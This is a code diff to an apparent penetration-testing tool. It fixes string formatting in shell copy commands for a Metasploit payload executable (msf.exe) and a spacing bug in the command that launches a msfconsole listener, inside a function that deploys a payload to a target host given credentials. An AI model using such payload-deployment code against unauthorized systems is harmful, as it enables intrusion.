@@ -189,11 +189,11 @@ def deploy_hex2binary(ipaddr, port, username, password):
                         if not os.path.isfile(core.setdir + "1msf.exe"):
                             # move it then
                             subprocess.Popen("cp %s/msf.exe %s/1msf.exe" %
-                                             (core.setdir + core.setdir), shell=True).wait()
+                                             (core.setdir, core.setdir), shell=True).wait()
                             subprocess.Popen("cp %s/1msf.exe %s/ 1> /dev/null 2> /dev/null" %
-                                             (core.setdir + core.setdir), shell=True).wait()
+                                             (core.setdir, core.setdir), shell=True).wait()
                             subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" %
-                                             (core.setdir + core.setdir), shell=True).wait()
+                                             (core.setdir, core.setdir), shell=True).wait()
             payload_filename = os.path.join(web_path + "1msf.exe")
 
         with open(payload_filename, "rb") as fileopen:
@@ -216,7 +216,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
                         import pexpect
                         core.print_status("Starting the Metasploit listener...")
                         msf_path = core.meta_path()
-                        child2 = pexpect.spawn("{0}-r {1}\r\n\r\n".format(os.path.join(core.meta_path() + "msfconsole"),
+                        child2 = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(core.meta_path() + "msfconsole"),
                                                                         os.path.join(core.setdir + "meta_config")))
 
         # random executable name
